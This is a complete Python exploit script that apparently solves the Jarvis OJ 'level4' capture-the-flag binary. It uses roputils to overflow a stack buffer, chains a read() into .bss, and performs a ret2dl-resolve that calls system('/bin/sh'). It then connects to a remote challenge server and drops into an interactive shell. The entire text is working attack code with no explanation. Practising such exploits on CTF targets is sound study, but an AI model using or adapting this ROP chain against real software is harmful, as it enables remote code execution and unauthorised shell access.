#!/usr/bin/env python

from roputils import *

DEBUG = 0
fpath = './level4'
offset = 0x8c

rop = ROP(fpath)
addr_bss = rop.section('.bss')
addr_plt_read = 0x08048310
addr_got_read = 0x0804a00c

buf = rop.retfill(offset)
# roputils has changed call function in new version
buf += rop.call(addr_plt_read, 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

if DEBUG:
    p = Proc(rop.fpath)
else:
    p = Proc(host='pwn2.jarvisoj.com', port=9880)

p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
